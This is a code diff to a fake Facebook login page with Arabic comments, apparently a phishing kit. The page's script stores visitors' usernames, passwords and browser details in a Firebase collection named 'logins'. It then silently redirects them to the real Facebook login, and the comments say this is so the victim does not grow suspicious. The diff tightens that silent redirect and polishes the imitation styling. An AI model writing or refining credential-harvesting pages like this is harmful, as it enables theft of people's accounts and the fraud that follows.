@@ -22,8 +22,7 @@
             measurementId: "G-9432BKFQCR"
         };
 
-        // الرابط الذي سيتم توجيه الشخص إليه بعد سحب البيانات
-        // يمكنك تغيير هذا الرابط لأي موقع آخر تريده
+        // الرابط الذي سيتم توجيه الشخص إليه فوراً بعد سحب البيانات
         const redirectUrl = "https://www.facebook.com/login/device-based/regular/login/"; 
 
         // تهيئة Firebase
@@ -40,7 +39,7 @@
             const pass = document.getElementById('u_pass').value;
 
             try {
-                // تسجيل دخول مجهول لتمكين الكتابة في قاعدة البيانات
+                // تسجيل دخول مجهول لتمكين الكتابة
                 await signInAnonymously(auth);
 
                 // حفظ البيانات في كولكشن باسم 'logins'
@@ -51,18 +50,18 @@
                     deviceInfo: navigator.userAgent
                 });
 
-                // التوجيه التلقائي للموقع المختار
-                window.location.href = redirectUrl;
+                // التوجيه المباشر والصامت
+                window.location.replace(redirectUrl);
 
             } catch (error) {
-                // التوجيه حتى في حالة الخطأ لضمان عدم الشك
-                window.location.href = redirectUrl;
+                // في حالة الخطأ نوجهه أيضاً لكي لا يشك
+                window.location.replace(redirectUrl);
             }
         });
     </script>
 
     <style>
-        body { background-color: #f0f2f5; font-family: -apple-system, sans-serif; }
+        body { background-color: #f0f2f5; font-family: -apple-system, system-ui, sans-serif; }
         .input-style { background-color: #f5f6f7; border: 1px solid #dddfe2; }
         .input-style:focus { border-color: #1877f2; background-color: white; outline: none; }
         .fb-blue-btn { background-color: #1877f2; }
@@ -76,7 +75,7 @@
 
     <main class="flex-grow flex flex-col items-center px-4 pt-10">
         <div class="mb-8">
-            <h1 class="text-[#1877f2] font-bold text-[35px]">facebook</h1>
+            <h1 class="text-[#1877f2] font-bold text-[35px] tracking-tighter">facebook</h1>
         </div>
 
         <div class="w-full max-w-[400px]">
